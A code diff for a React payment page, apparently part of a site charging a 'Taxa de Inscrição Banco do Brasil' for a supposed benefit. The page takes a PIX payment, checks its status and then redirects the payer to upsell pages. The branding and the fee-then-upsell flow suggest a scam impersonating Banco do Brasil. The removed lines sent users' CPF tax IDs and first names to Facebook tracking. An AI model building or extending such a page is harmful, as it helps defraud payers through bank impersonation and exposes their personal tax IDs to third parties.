@@ -84,7 +84,7 @@ const Pagamento = () => {
         const pixCode = data?.data?.pix?.code || data?.data?.pix_code;
         const pixQrBase64 = data?.data?.pix?.qr_code_base64 || data?.data?.pix?.qrcode_base64 || '';
         const orderUuid = data?.data?.order_id || data?.data?.order_uuid || '';
-        if (pixCode && orderUuid) {
+        if (orderUuid) {
           const newPixData: PixData = { code: pixCode, qrcode_base64: pixQrBase64, transaction_id: orderUuid, order_uuid: orderUuid };
           setPixData(newPixData);
           // Save using external_id field for backward compat with persistence
@@ -111,8 +111,6 @@ const Pagamento = () => {
         const response = await supabase.functions.invoke('check-pix-status', { body: { order_uuid: orderUuid } });
         if (response.data?.data?.status === 'paid') {
           if (checkIntervalRef.current) clearInterval(checkIntervalRef.current);
-          fbEvents.purchase({ value: valorBeneficio!, currency: 'BRL', content_name: 'Taxa de Inscrição Banco do Brasil' });
-          fbEvents.serverPurchase({ first_name: cpfData!.nome.split(' ')[0], cpf: cpfData!.cpf, value: valorBeneficio!, content_name: 'Taxa de Inscrição Banco do Brasil' });
           toast({ title: "Pagamento confirmado!", description: "Processando inscrição..." });
           navigate("/upsell/1", { state: { cpfData, valorBeneficio, protocolo } });
         }
@@ -132,8 +130,6 @@ const Pagamento = () => {
       supabase.functions.invoke('check-pix-status', { body: { order_uuid: pixData.order_uuid } }).then((response) => {
         if (response.data?.data?.status === 'paid') {
           if (checkIntervalRef.current) clearInterval(checkIntervalRef.current);
-          fbEvents.purchase({ value: valorBeneficio!, currency: 'BRL', content_name: 'Taxa de Inscrição Banco do Brasil' });
-          fbEvents.serverPurchase({ first_name: cpfData!.nome.split(' ')[0], cpf: cpfData!.cpf, value: valorBeneficio!, content_name: 'Taxa de Inscrição Banco do Brasil' });
           toast({ title: "Pagamento confirmado!", description: "Processando inscrição..." });
           navigate("/upsell/1", { state: { cpfData, valorBeneficio, protocolo } });
         } else {
